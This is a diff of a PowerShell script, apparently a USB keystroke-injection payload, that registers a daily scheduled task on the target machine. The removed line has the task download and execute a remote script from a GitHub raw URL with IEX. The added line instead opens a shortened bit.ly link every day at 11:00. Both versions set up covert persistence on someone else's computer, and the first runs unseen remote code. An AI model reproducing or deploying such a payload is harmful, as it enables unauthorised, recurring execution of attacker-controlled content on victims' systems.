@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/what.ps1');'
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Start-Process https://bit.ly/34niz9I'
 
 $trigger = New-ScheduledTaskTrigger -Daily -At 11:00
 
